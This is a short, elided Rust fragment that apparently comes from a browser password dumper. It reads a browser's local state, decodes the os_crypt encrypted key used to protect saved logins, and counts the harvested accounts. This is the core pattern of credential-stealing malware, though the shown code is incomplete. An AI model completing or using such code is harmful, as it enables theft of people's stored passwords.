...
impl Dumper {
    ...
    pub fn dump(&mut self) -> DumperResult<Vec<String>> {
        let local_state = self.read_local_state().ok();
        if let Some(local_state) = local_state {
            let mut decoded_encryption_key = decode(local_state.os_crypt.encrypted_key.to_string()).map_err(|_| DumperError::Base64Error)?;
            ...
            unsafe {
                crate::PASSWORD += self.accounts.len() as i64;
            }
            unsafe {
